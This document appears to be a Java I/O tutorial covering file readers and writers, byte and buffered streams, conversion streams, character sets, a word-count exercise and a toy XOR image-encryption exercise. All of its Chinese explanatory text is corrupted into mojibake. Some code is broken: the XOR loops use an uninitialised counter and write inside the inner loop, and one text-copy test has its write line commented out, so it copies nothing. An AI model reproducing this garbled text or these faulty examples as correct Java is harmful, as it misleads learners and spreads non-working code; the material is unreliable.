2ï¼å¼‚å¸¸çš„å¤„ç†:ä¸ºäº†ä¿è¯æµèµ„æºä¸€å®šå¯ä»¥æ‰§è¡Œå…³é—­æ“ä½œã€‚éœ€è¦ä½¿ç”¨try-catch-finallyå¤„ç† 3. è¯»å…¥çš„æ–‡ä»¶ä¸€å®šè¦å­˜åœ¨ */ @Test public void test(){ //å¦‚æœæ˜¯åœ¨mainæ–¹æ³•ä¸­ï¼Œåˆ™ç›¸å¯¹è·¯å¾„æ˜¯ç›¸å¯¹äºå½“å‰å·¥ç¨‹ //ã€åŠŸèƒ½ã€‘ï¼šè¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¨‹åºä¸­ï¼Œå¹¶è¾“å‡ºåˆ°æ§åˆ¶å° FileReader fr = null; try{ //1.å®ä¾‹åŒ–Fileç±»çš„å¯¹è±¡ï¼ŒæŒ‡æ˜è¦æ“ä½œçš„æ–‡ä»¶ File file = new File("d:\\io\\1.txt"); //2.æä¾›å…·ä½“çš„æµ fr = new FileReader(file); //3.æ•°æ®çš„è¯»å…¥ //read():è¿”å›è¯»å…¥çš„ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¾¾åˆ°æ–‡ä»¶æœ«å°¾ï¼Œè¿”å›-1 //æ–¹å¼1ï¼š // int data = fr.read(); // è¿”å›-1è¡¨ç¤ºè¯»å®Œäº† // while (data != -1){ // System.out.println((char) data); // data = fr.read(); //ç»§ç»­å‘åè¯» // } //æ–¹å¼2: int data; while ((data = fr.read()) != -1){ System.out.println((char) data); } }catch (Exception e) { e.printStackTrace(); }finally { //4.æµçš„å…³é—­ try{ if(fr != null){ fr.close(); } }catch (Exception e){ e.printStackTrace(); } } } /* FileReader(char[] cbuf)è¯»å…¥æ•°æ® å¯¹read()æ“ä½œå‡çº§: ä½¿ç”¨readçš„é‡è½½æ–¹æ³• */ @Test public void test1(){ FileReader fr = null; try{ //1.å®ä¾‹åŒ–Fileç±»çš„å¯¹è±¡ï¼ŒæŒ‡æ˜è¦æ“ä½œçš„æ–‡ä»¶ File file = new File("d:\\io\\1.txt"); //2.FileReaderçš„å®ä¾‹åŒ–ï¼Œæä¾›å…·ä½“çš„æµ fr = new FileReader(file); //3.æ•°æ®çš„è¯»å…¥æ“ä½œï¼ˆéš¾ç‚¹ï¼‰ï¼š char[] cbuf = new char[5]; //æ¯æ¬¡è¯»å…¥cbufæ•°ç»„é•¿åº¦ä¸ªå­—ç¬¦çš„ä¸ªæ•°ï¼Œå¦‚æœè¾¾åˆ°æ–‡ä»¶æœ«å°¾åˆ™è¿”å›-1 int len; while ((len = fr.read(cbuf)) != -1){ //æ–¹å¼1ï¼š for (int i = 0; i &lt; len; i++) { System.out.print(cbuf[i]); } //æ–¹å¼2ï¼š // String str = new String(cbuf, 0,len); //ä»0å¼€å§‹æ¯æ¬¡å–lenä¸ª // System.out.println(str); } }catch (Exception e) { e.printStackTrace(); }finally { //4.æµèµ„æºçš„å…³é—­ try{ if(fr != null){ fr.close(); } }catch (Exception e){ e.printStackTrace(); } } } /* FileWriter(): ä»å†…å­˜ä¸­å†™å‡ºæ•°æ®åˆ°ç¡¬ç›˜çš„æ–‡ä»¶ä¸­ 1ï¼è¾“å‡ºæ“ä½œï¼Œå¯¹åº”çš„FiLeæ˜¯å¯ä»¥ä¸å­˜åœ¨çš„ã€‚ å¦‚æœä¸å­˜åœ¨ï¼Œåœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºæ­¤æ–‡ä»¶ã€‚ å¦‚æœå­˜åœ¨ï¼Œé»˜è®¤å‚æ•°append:falseä¼šå¯¹åŸæœ‰æ–‡ä»¶çš„è¦†ç›–; trueåˆ™åœ¨åŸæœ‰æ–‡ä»¶åŸºç¡€ä¸Šæ·»åŠ  å³: å¦‚æœæµä½¿ç”¨çš„æ„é€ å™¨æ˜¯:FiLewriter(fiLe,false)/FiLewriter(fiLe):å¯¹åŸæœ‰æ–‡ä»¶çš„è¦†ç›– å¦‚æœæµä½¿ç”¨çš„æ„é€ å™¨æ˜¯:FiLewriter(file,true):ä¸ä¼šå¯¹åŸæœ‰æ–‡ä»¶è¦†ç›–ï¼Œè€Œæ˜¯åœ¨åŸæœ‰æ–‡ä»¶åŸºç¡€ä¸Šè¿½åŠ å†…å®¹ */ @Test public void test2(){ FileWriter fw = null; try{ // 1.æä¾›Fileç±»çš„å¯¹è±¡ï¼ŒæŒ‡æ˜å†™å‡ºåˆ°çš„æ–‡ä»¶ File file = new File("d:\\io\\11.txt"); //2.æä¾›FileWriterçš„å¯¹è±¡ï¼Œç”¨äºæ•°æ®çš„å†™å‡º fw = new FileWriter(file, false); //3.å†™å‡ºçš„æ“ä½œ fw.write("hhh hhh hdaldk\n"); fw.write("hhh 222 hdaldk\n"); }catch (Exception e){ e.printStackTrace(); }finally { try { //4.æµèµ„æºçš„å…³é—­ fw.close(); }catch (Exception e){ e.printStackTrace(); } } } /* ä½¿ç”¨FileReaderå’ŒFileWriterå®ç°æ–‡æœ¬æ–‡ä»¶çš„å¤åˆ¶ */ @Test public void test3() { FileReader fr = null; FileWriter fw = null; try { // 1.åˆ›å»ºFileç±»çš„å¯¹è±¡ï¼ŒæŒ‡æ˜è¯»å…¥å’Œå†™å‡ºçš„æ–‡ä»¶ File srcFile = new File("d:\\io\\1.txt"); File dstFile = new File("d:\\io\\111.txt"); // 2.åˆ›å»ºè¾“å…¥æµå’Œè¾“å‡ºæµçš„æ“ä½œ fr = new FileReader(srcFile); fw = new FileWriter(dstFile); // 3.æ•°æ®çš„è¯»å…¥å’Œå†™å‡ºæ“ä½œ char[] cbuf = new char[5]; int len; //æ¯æ¬¡è¯»å…¥cbufæ•°ç»„é•¿åº¦ä¸ªå­—ç¬¦çš„ä¸ªæ•° while ((len = fr.read(cbuf)) != -1) { // fw.write(cbuf, 0, len); //æ¯æ¬¡å†™å‡ºlenä¸ªå­—ç¬¦ } // 4.å…³é—­æµèµ„æº }catch(Exception e){ e.printStackTrace(); }finally{ try { if(fr != null){ fr.close(); } } catch (Exception e) { e.printStackTrace(); }finally { try { if(fw != null){ fw.close(); } } catch (Exception e) { e.printStackTrace(); } } } } å­—èŠ‚æµ FileInputStream FileOutputStream /* å­—èŠ‚æµï¼š FileInputStream FileOutputStream ç»“è®ºï¼šFileInputStream å¯¹äºæ–‡æœ¬æ–‡ä»¶ï¼Œè¿˜æ˜¯è¦ç”¨å­—ç¬¦æµ å¯¹äºå›¾ç‰‡ç­‰ï¼Œè¿˜æ˜¯è¦ç”¨å­—èŠ‚æµ */ @Test public void test4(){ FileInputStream fis = null; try{ //1.é€ æ–‡ä»¶ File file = new File("d:\\io\\1.txt"); //2.é€ æµ fis = new FileInputStream(file); //3.è¯»æ•°æ® byte[] buffer = new byte[5]; int len; //è®°å½•æ¯æ¬¡è¯»å–çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = fis.read(buffer)) != -1){ String str = new String(buffer,0, len); System.out.println(str); // è¿™æ ·ä¸­æ–‡å¯èƒ½ä¹±ç ï¼Œå› ä¸ºuft-8ä¸­æ–‡ä¸€ä¸ªå­—æ˜¯å 3ä¸ªå­—èŠ‚ } // File file = new File("d:\\io\\1.txt"); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.å…³é—­èµ„æº try{ fis.close(); }catch (Exception e){ e.printStackTrace(); } } } /* FileOutputStream å®ç°å¯¹å›¾ç‰‡çš„å¤åˆ¶æ“ä½œ å¦‚æœåªæ˜¯ç›¸å¯¹æ–‡æœ¬æ–‡ä»¶è¿›è¡Œå¤åˆ¶æ“ä½œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å­—èŠ‚æµ */ @Test public void test5(){ FileInputStream fis = null; FileOutputStream fos = null; try{ //1.é€ æ–‡ä»¶ File srcFile = new File("d:\\io\\1.png"); File dstFile = new File("d:\\io\\2.png"); //2.é€ æµ fis = new FileInputStream(srcFile); fos = new FileOutputStream(dstFile); //3.å¤åˆ¶çš„è¿‡ç¨‹ byte[] buffer = new byte[10]; int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = fis.read(buffer)) != -1){ fos.write(buffer, 0, len); // æ¯æ¬¡å†™10ä¸ªå­—èŠ‚ } System.out.println("å¤åˆ¶ok."); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.å…³é—­èµ„æº try{ if(fis != null){ fis.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(fos != null){ fos.close(); } }catch (Exception e){ e.printStackTrace(); } } } //ä¸ºäº†æ–¹ä¾¿æŒ‡å®šè·¯å¾„ä¸‹æ–‡ä»¶çš„å¤åˆ¶(å°è£…ä¸ºä¸€ä¸ªå‡½æ•°) public void copyFile(String srcPath, String dstPath){ FileInputStream fis = null; FileOutputStream fos = null; try{ //1.é€ æ–‡ä»¶ File srcFile = new File(srcPath); File dstFile = new File(dstPath); //2.é€ æµ fis = new FileInputStream(srcFile); fos = new FileOutputStream(dstFile); //3.å¤åˆ¶çš„è¿‡ç¨‹ byte[] buffer = new byte[1024]; // å¹¶ä¸æ˜¯è¶Šå¤§è¶Šå¥½(å¤ªå¤§äº†å å†…å­˜å¤§äº†ï¼Œæ‰¾ä¸ªé€‚ä¸­çš„) int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = fis.read(buffer)) != -1){ fos.write(buffer, 0, len); // æ¯æ¬¡å†™10ä¸ªå­—èŠ‚ } System.out.println("å¤åˆ¶ok."); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.å…³é—­èµ„æº try{ if(fis != null){ fis.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(fos != null){ fos.close(); } }catch (Exception e){ e.printStackTrace(); } } } @Test public void testCopy(){ long start = System.currentTimeMillis(); //å¯ä»¥ç›´æ¥è°ƒç”¨æˆ‘ä»¬å°è£…å¥½çš„å¤åˆ¶æ–‡ä»¶çš„å‡½æ•°ï¼š copyFile("d:\\io\\xiaodi.mp4", "d:\\io\\study.mp4"); // åé¢å†å­¦å¯¹äºè§†é¢‘å¯ä»¥ç”¨ç¼“å†²æµ long end = System.currentTimeMillis(); System.out.println(end - start); } å¤„ç†æµ1.ç¼“å†²æµ(ä½¿ç”¨çš„æ›´å¤š) å¼€å‘ä¸­ç”¨ç¼“å†²æµå¤šï¼Œä¸€èˆ¬ä¸ç”¨å‰é¢çš„å­—èŠ‚æµ(FileInputStreamFileã€OutputStream) BufferedInputStream BufferedOutputStream BufferedReader BufferedWriter ç¼“å†²æµä½œç”¨ï¼šæä¾›æµçš„è¯»å–ã€å†™å…¥çš„é€Ÿåº¦ â€”-&gt; åŸå› ï¼šæé«˜è¯»å†™é€Ÿåº¦çš„åŸå› :å†…éƒ¨æä¾›äº†ä¸€ä¸ªç¼“å†²åŒº å¤„ç†æµ, å°±æ˜¯â€œå¥—æ¥â€åœ¨å·²æœ‰çš„æµçš„åŸºç¡€ä¸Šã€‚ ç¼“å†²æµä¸èŠ‚ç‚¹æµï¼š BufferedInputStream BufferedOutputStream /* BufferedInputStream BufferedOutputStream ç¼“å†²æµä½œç”¨ï¼šæä¾›æµçš„è¯»å–ã€å†™å…¥çš„é€Ÿåº¦ ----> åŸå› ï¼šæé«˜è¯»å†™é€Ÿåº¦çš„åŸå› :å†…éƒ¨æä¾›äº†ä¸€ä¸ªç¼“å†²åŒº */ @Test public void test6(){ //ä»¥éæ–‡æœ¬å¤åˆ¶æ–‡ä»¶ä¸ºä¾‹ bufferCopyFile("d:\\io\\xiaodi.mp4", "d:\\io\\xiaodi2.mp4"); } public void bufferCopyFile(String srcPath, String dstPath){ //ç¼“å†²æµä¸å­—èŠ‚æµ FileInputStream fis = null; FileOutputStream fos = null; BufferedInputStream bis = null; BufferedOutputStream bos = null; try{ //1.é€ æ–‡ä»¶ File srcFile = new File(srcPath); File dstFile = new File(dstPath); //2.é€ æµ(å¤„ç†æµä¸èƒ½ç›´æ¥ä½œç”¨åŸŸæ–‡ä»¶ä¸Š): å…ˆé€ é‡Œå±‚çš„æµ, å†é€ å¤–å±‚çš„æµ //2.1é€ èŠ‚ç‚¹æµ fis = new FileInputStream(srcFile); fos = new FileOutputStream(dstFile); //2.2é€ ç¼“å†²æµ bis = new BufferedInputStream(fis); bos = new BufferedOutputStream(fos); //3.å¤åˆ¶çš„è¿‡ç¨‹: è¯»å–ï¼Œå†™å…¥ byte[] buffer = new byte[10]; // å¹¶ä¸æ˜¯è¶Šå¤§è¶Šå¥½(å¤ªå¤§äº†å å†…å­˜å¤§äº†ï¼Œæ‰¾ä¸ªé€‚ä¸­çš„) int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = bis.read(buffer)) != -1){ // ç”¨bisæ¥read bos.write(buffer, 0, len); // ç”¨bosæ¥writeï¼Œæ¯æ¬¡å†™10ä¸ªå­—èŠ‚ } System.out.println("å¤åˆ¶ok."); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.å…³é—­èµ„æºï¼ˆè¦æ±‚:å…ˆå…³å¤–å±‚çš„æµ(å¤„ç†æµ), åœ¨å…³é‡Œå±‚çš„æµï¼‰ // è¯´æ˜ï¼šåœ¨å…³é—­å¤–å±‚æµçš„åŒæ—¶ï¼Œå†…å±‚æµä¹Ÿä¼šè‡ªåŠ¨å…³é—­(æˆ‘ä»¬å¯ä»¥çœç•¥ä¸å†™äº†å°±) try{ if(bis != null){ bis.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(bos != null){ bos.close(); } }catch (Exception e){ e.printStackTrace(); } } } ç¼“å†²æµä¸å­—ç¬¦æµï¼šï¼ˆï¼‰ BufferedReader BufferedWriter //ä»¥æ–‡æœ¬æ–‡ä»¶å¤åˆ¶ä¸ºä¾‹ // BufferedReaderã€BufferedWriter bufferCopyTxtFile("d:\\io\\1.txt", "d:\\io\\11111.txt"); public void bufferCopyTxtFile(String srcPath, String dstPath){ //ç¼“å†²æµä¸å­—ç¬¦æµ BufferedReader br = null; BufferedWriter bw = null; try{ //1.é€ æ–‡ä»¶ã€é€ æµ(ç†Ÿç»ƒä¹‹åå¯ä»¥è¿™æ ·å†™åœ¨ä¸€èµ·) br = new BufferedReader(new FileReader(new File(srcPath))); bw = new BufferedWriter(new FileWriter(new File(dstPath))); //2.è¯»å–ï¼Œå†™å…¥(å­—ç¬¦æµ) //æ–¹å¼1ï¼š // char[] cbuf = new char[1024]; // int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„ä¸ªæ•° // while ((len = br.read(cbuf)) != -1){ // ç”¨bisæ¥read // bw.write(cbuf, 0, len); //// bw.flush(); // } //æ–¹å¼2ï¼š String data; while((data = br.readLine()) != null){ //ä¸€æ¬¡è¯»ä¸€è¡Œ //æ–¹æ³•1ï¼š bw.write(data + "\n"); //dataä¸­ä¸åŒ…å«æ¢è¡Œç¬¦ //æ–¹æ³•2ï¼š bw.write(data ); //dataä¸­ä¸åŒ…å«æ¢è¡Œç¬¦ bw.newLine(); //æä¾›æ¢è¡Œæ“ä½œ } System.out.println("å¤åˆ¶ok."); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.å…³é—­èµ„æºï¼ˆè¦æ±‚:å…ˆå…³å¤–å±‚çš„æµ(å¤„ç†æµ), åœ¨å…³é‡Œå±‚çš„æµï¼‰ // è¯´æ˜ï¼šåœ¨å…³é—­å¤–å±‚æµçš„åŒæ—¶ï¼Œå†…å±‚æµä¹Ÿä¼šè‡ªåŠ¨å…³é—­(æˆ‘ä»¬å¯ä»¥çœç•¥ä¸å†™äº†å°±) try{ if(br != null){ br.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(bw != null){ bw.close(); } }catch (Exception e){ e.printStackTrace(); } } } ç»ƒä¹ 1ï¼šå®ç°å›¾ç‰‡åŠ å¯†æ“ä½œ //æç¤º: //å›¾ç‰‡åŠ å¯†ï¼š FileInputStream fis = new FileInputStream(srcFile); FileOutputStream fos = new FileOutputStream(dstFile); byte[] buffer = new byte[1024]; int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = fis.read(buffer)) != -1){ for(int i; i&lt;len; i++){ buffer[i] = (byte)(buffer[i]^5); //æ¯ä½å­—èŠ‚åšäº†å¼‚æˆ–çš„è¿ç®— fos.write(buffer, 0, len); } } //å›¾ç‰‡è§£å¯†ï¼š FileInputStream fis = new FileInputStream("åŠ å¯†åçš„æ–‡ä»¶"); FileOutputStream fos = new FileOutputStream(dstFile); byte[] buffer = new byte[1024]; int len; //è®°å½•æ¯æ¬¡è¯»å…¥çš„å­—èŠ‚çš„ä¸ªæ•° while ((len = fis.read(buffer)) != -1){ for(int i; i&lt;len; i++){ buffer[i] = (byte)(buffer[i]^5); //æ¯ä½å­—èŠ‚åšäº†å¼‚æˆ–çš„è¿ç®—ï¼Œè¿˜åŸ fos.write(buffer, 0, len); } } ç»ƒä¹ 1*2ï¼šè·å–æ–‡æœ¬ä¸Šæ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•° //æç¤º:éå†æ–‡æœ¬çš„æ¯ä¸€ä¸ªå­—ç¬¦;å­—ç¬¦åŠå‡ºç°çš„æ¬¡æ•°ä¿å­˜åœ¨Mapä¸­(keyæ˜¯å­—ç¬¦,valueæ˜¯æ¬¡æ•°);å°†Mapä¸­æ•°æ®å†™å…¥æ–‡ä»¶ package cn.xpshuai.java3; import org.junit.Test; import java.io.*; import java.util.HashMap; import java.util.Map; import java.util.Set; /** * * æ€è·¯ï¼š * 1.éå†æ–‡æœ¬æ¯ä¸€ä¸ªå­—ç¬¦ * 2.å­—ç¬¦å‡ºç°çš„æ¬¡æ•°å­˜åœ¨Mapä¸­ * * Map&lt;Character,Integer> map = new HashMap&lt;Character,Integer>(); * map.put('a',18); * map.put('ä½ ',2); * * 3.æŠŠmapä¸­çš„æ•°æ®å†™å…¥æ–‡ä»¶ * */ public class WordCount { /* è¯´æ˜ï¼šå¦‚æœä½¿ç”¨å•å…ƒæµ‹è¯•ï¼Œæ–‡ä»¶ç›¸å¯¹è·¯å¾„ä¸ºå½“å‰module å¦‚æœä½¿ç”¨main()æµ‹è¯•ï¼Œæ–‡ä»¶ç›¸å¯¹è·¯å¾„ä¸ºå½“å‰å·¥ç¨‹ */ @Test public void testWordCount() { FileReader fr = null; BufferedWriter bw = null; try { //1.åˆ›å»ºMapé›†åˆ Map&lt;Character, Integer> map = new HashMap&lt;Character, Integer>(); //2.éå†æ¯ä¸€ä¸ªå­—ç¬¦,æ¯ä¸€ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°æ”¾åˆ°mapä¸­ fr = new FileReader("dbcp.txt"); int c = 0; while ((c = fr.read()) != -1) { //int è¿˜åŸ char char ch = (char) c; // åˆ¤æ–­charæ˜¯å¦åœ¨mapä¸­ç¬¬ä¸€æ¬¡å‡ºç° if (map.get(ch) == null) { map.put(ch, 1); } else { map.put(ch, map.get(ch) + 1); } } //3.æŠŠmapä¸­æ•°æ®å­˜åœ¨æ–‡ä»¶count.txt //3.1 åˆ›å»ºWriter bw = new BufferedWriter(new FileWriter("wordcount.txt")); //3.2 éå†map,å†å†™å…¥æ•°æ® Set&lt;Map.Entry&lt;Character, Integer>> entrySet = map.entrySet(); for (Map.Entry&lt;Character, Integer> entry : entrySet) { switch (entry.getKey()) { case ' ': bw.write("ç©ºæ ¼=" + entry.getValue()); break; case '\t'://\tè¡¨ç¤ºtab é”®å­—ç¬¦ bw.write("tabé”®=" + entry.getValue()); break; case '\r':// bw.write("å›è½¦=" + entry.getValue()); break; case '\n':// bw.write("æ¢è¡Œ=" + entry.getValue()); break; default: bw.write(entry.getKey() + "=" + entry.getValue()); break; } bw.newLine(); } } catch (IOException e) { e.printStackTrace(); } finally { //4.å…³æµ if (fr != null) { try { fr.close(); } catch (IOException e) { e.printStackTrace(); } } if (bw != null) { try { bw.close(); } catch (IOException e) { e.printStackTrace(); } } } } } 2.è½¬æ¢æµ è½¬æ¢æµæä¾›äº†åœ¨å­—èŠ‚æµå’Œå­—ç¬¦æµä¹‹é—´çš„è½¬æ¢ å±äºå­—ç¬¦æµ ä½œç”¨ï¼šæä¾›å­—èŠ‚æµä¸å­—ç¬¦æµä¹‹é—´çš„è½¬æ¢ Java APIæä¾›äº†ä¸¤ä¸ªè½¬æ¢æµ: InputStreamReader: å°†lnputStreamè½¬æ¢ä¸ºReader outputStreamWriter:å°†Writerè½¬æ¢ä¸ºOutputStream å­—èŠ‚æµä¸­çš„æ•°æ®éƒ½æ˜¯å­—ç¬¦æ—¶ï¼Œè½¬æˆå­—ç¬¦æµæ“ä½œæ›´é«˜æ•ˆã€‚å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä½¿ç”¨è½¬æ¢æµæ¥å¤„ç†æ–‡ä»¶ä¹±ç é—®é¢˜ã€‚å®ç°ç¼–ç å’Œè§£ç çš„åŠŸèƒ½ã€‚ package cn.xpshuai.java1; import org.junit.Test; import java.io.*; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-30 11:24 * @åŠŸèƒ½ï¼šå¤„ç†æµ2ï¼šè½¬æ¢æµçš„ä½¿ç”¨ * * 1.è½¬æ¢æµï¼šå±äºå­—ç¬¦æµ * - InputStreamReader: å°†å­—èŠ‚çš„è¾“å…¥æµInputStreamè½¬æ¢ä¸ºå­—ç¬¦çš„è¾“å…¥æµReader * - outputStreamWriter:å°†å­—ç¬¦çš„è¾“å‡ºæµWriterè½¬æ¢ä¸ºå­—èŠ‚çš„è¾“å‡ºæµOutputStream * * 2.è§£ç ï¼šå­—èŠ‚ã€å­—èŠ‚æ•°ç»„ --> å­—ç¬¦æ•°ç»„ã€å­—ç¬¦ä¸² * ç¼–ç ï¼šå­—ç¬¦æ•°ç»„ã€å­—ç¬¦ä¸² --> å­—èŠ‚ã€å­—èŠ‚æ•°ç»„ * * * 3.å­—ç¬¦é›† * * * */ public class InputStreamReaderTest { /* è¾“å…¥æµ InputStreamReader */ @Test public void test() throws IOException { //ä»ç„¶éœ€è¦try-catchï¼Œè¿™é‡Œæˆ‘å·æ‡’ä¸€ä¸‹ FileInputStream fis = new FileInputStream(new File("d:\\io\\1.txt")); InputStreamReader isr = new InputStreamReader(fis, "UTF-8"); //é»˜è®¤ä½¿ç”¨ç³»ç»Ÿçš„å­—ç¬¦é›† char[] cbuf = new char[5]; int len; while ((len = isr.read(cbuf)) != -1){ String str = new String(cbuf, 0, len); System.out.println(str); } isr.close(); } /* è¾“å‡ºæµï¼šoutputStreamWriter ç»¼åˆä½¿ç”¨InputStreamReaderå’ŒoutputStreamWriterï¼Œè¯»å–ï¼Œæ¢ä¸ªå­—ç¬¦é›†ï¼Œå†å†™å‡ºå» */ @Test public void test1() throws IOException { //1.é€ æ–‡ä»¶ã€é€ æµ FileInputStream fis = new FileInputStream(new File("d:\\io\\1.txt")); FileOutputStream fos = new FileOutputStream(new File("d:\\io\\1_gbk.txt")); InputStreamReader isr = new InputStreamReader(fis, "UTF-8"); //é»˜è®¤ä½¿ç”¨ç³»ç»Ÿçš„å­—ç¬¦é›† OutputStreamWriter osw = new OutputStreamWriter(fos, "gbk"); //2.è¯»å–å†™å…¥ char[] cbuf = new char[5]; int len; while ((len = isr.read(cbuf)) != -1){ osw.write(cbuf, 0, len); } //3.å…³é—­ isr.close(); osw.close(); } } å­—ç¬¦é›†ç¼–ç è¡¨çš„ç”±æ¥ è®¡ç®—æœºåªèƒ½è¯†åˆ«äºŒè¿›åˆ¶æ•°æ®ï¼Œæ—©æœŸç”±æ¥æ˜¯ç”µä¿¡å·ã€‚ä¸ºäº†æ–¹ä¾¿åº”ç”¨è®¡ç®—æœºï¼Œè®©å®ƒå¯ä»¥è¯†åˆ«å„ä¸ªå›½å®¶çš„æ–‡å­—ã€‚å°±å°†å„ä¸ªå›½å®¶çš„æ–‡å­—ç”¨æ•°å­—æ¥è¡¨ç¤ºï¼Œå¹¶ä¸€â€•å¯¹åº”ï¼Œå½¢æˆä¸€å¼ è¡¨ã€‚è¿™å°±æ˜¯ç¼–ç è¡¨ã€‚ å¸¸è§çš„ç¼–ç è¡¨ ASCII: ç¾å›½æ ‡å‡†ä¿¡æ¯äº¤æ¢ç ã€‚ç”¨ä¸€ä¸ªå­—èŠ‚çš„7ä½å¯ä»¥è¡¨ç¤ºã€‚ ISO8859-1: æ‹‰ä¸ç è¡¨/æ¬§æ´²ç è¡¨ç”¨ä¸€ä¸ªå­—èŠ‚çš„8ä½è¡¨ç¤ºã€‚ GB2312: ä¸­å›½çš„ä¸­æ–‡ç¼–ç è¡¨ã€‚æœ€å¤šä¸¤ä¸ªå­—èŠ‚ç¼–ç æ‰€æœ‰å­—ç¬¦ GBK: ä¸­å›½çš„ä¸­æ–‡ç¼–ç è¡¨å‡çº§ï¼Œèåˆäº†æ›´å¤šçš„ä¸­æ–‡æ–‡å­—ç¬¦å·ã€‚æœ€å¤šä¸¤ä¸ªå­—èŠ‚ç¼–ç  Unicode: å›½é™…æ ‡å‡†ç ï¼Œèåˆäº†ç›®å‰äººç±»ä½¿ç”¨çš„æ‰€æœ‰å­—ç¬¦ã€‚ä¸ºæ¯ä¸ªå­—ç¬¦åˆ†é…å”¯ä¸€çš„å­—ç¬¦ç ã€‚æ‰€æœ‰çš„æ–‡å­—éƒ½ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚ UTF-8:å˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œå¯ç”¨1-4ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚ Unicodeä¸å®Œç¾ï¼Œè¿™é‡Œå°±æœ‰ä¸‰ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œè‹±æ–‡å­—æ¯åªç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºå°±å¤Ÿäº†ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯å¦‚ä½•æ‰èƒ½åŒºåˆ«Unicodeåˆ©å’ŒIIASCIl?è®¡ç®—æœºæ€ä¹ˆçŸ¥é“ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œè€Œä¸æ˜¯åˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªç¬¦å·å‘¢?ç¬¬ä¸‰ä¸ªï¼Œå¦‚æœå’ŒIGBKç­‰åŒå­—èŠ‚ç¼–ç æ–¹å¼ä¸€æ ·ï¼Œç”¨æœ€é«˜ä½æ˜¯1æˆ–Oè¡¨ç¤ºä¸¤ä¸ªå­—èŠ‚å’Œä¸€ä¸ªå­—èŠ‚ï¼Œå°±å°‘äº†å¾ˆå¤šå€¼æ— æ³•ç”¨äºè¡¨ç¤ºå­—ç¬¦ï¼Œä¸å¤Ÿè¡¨ç¤ºæ‰€æœ‰å­—ç¬¦ã€‚Unicodeåœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ— æ³•æ¨å¹¿ï¼Œç›´åˆ°äº’è”ç½‘çš„å‡ºç°ã€‚ é¢å‘ä¼ è¾“çš„ä¼—å¤šUTF (UCS Transfer Formatã€‰æ ‡å‡†å‡ºç°äº†ï¼Œé¡¾åæ€ä¹‰ï¼ŒUTF-8å°±æ˜¯æ¯æ¬¡8ä¸ªä½ä¼ è¾“æ•°æ®ï¼Œè€ŒUTF-16å°±æ˜¯æ¯æ¬¡16ä¸ªä½ã€‚è¿™æ˜¯ä¸ºä¼ è¾“è€Œè®¾è®¡çš„ç¼–ç ï¼Œå¹¶ä½¿ç¼–ç æ— å›½ç•Œï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºå…¨ä¸–ç•Œä¸Šæ‰€æœ‰æ–‡åŒ–çš„å­—ç¬¦äº†ã€‚ Unicodeåªæ˜¯å®šä¹‰äº†ä¸€ä¸ªåºå¤§çš„ã€å…¨çƒé€šç”¨çš„å­—ç¬¦é›†ï¼Œå¹¶ä¸ºæ¯ä¸ªå­—ç¬¦è§„å®šäº†å”¯ä¸€ç¡®å®šçš„ç¼–å·ï¼Œå…·ä½“å­˜å‚¨æˆä»€ä¹ˆæ ·çš„å­—èŠ‚æµï¼Œå–å†³äºå­—ç¬¦ç¼–ç æ–¹æ¡ˆã€‚æ¨èçš„Unicodeç¼–ç æ˜¯UTF-8å’ŒUTF-16ã€‚ ANSIç¼–ç , é€šå¸¸æŒ‡çš„æ˜¯å¹³å°çš„é»˜è®¤ç¼–ç ,ä¾‹å¦‚è‹±æ–‡æ“ä½œç³»ç»Ÿä¸­æ˜¯ISO-8859-1ï¼Œä¸­æ–‡ç³»ç»Ÿæ˜¯GBK Unicodeå­—ç¬¦é›†åªæ˜¯å®šä¹‰äº†å­—ç¬¦çš„é›†åˆå’Œå”¯ä¸€ç¼–å·ï¼ŒUnicodeç¼–ç ï¼Œåˆ™æ˜¯å¯¹UTF-8ã€UCS-2/UTF-16ç­‰å…·ä½“ç¼–ç æ–¹æ¡ˆçš„ç»Ÿç§°è€Œå·²ï¼Œå¹¶ä¸æ˜¯å…·ä½“çš„ç¼–ç æ–¹æ¡ˆã€‚ æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ(äº†è§£å³å¯) System.inå’ŒSystem.outåˆ†åˆ«ä»£è¡¨äº†ç³»ç»Ÿæ ‡å‡†çš„è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡ 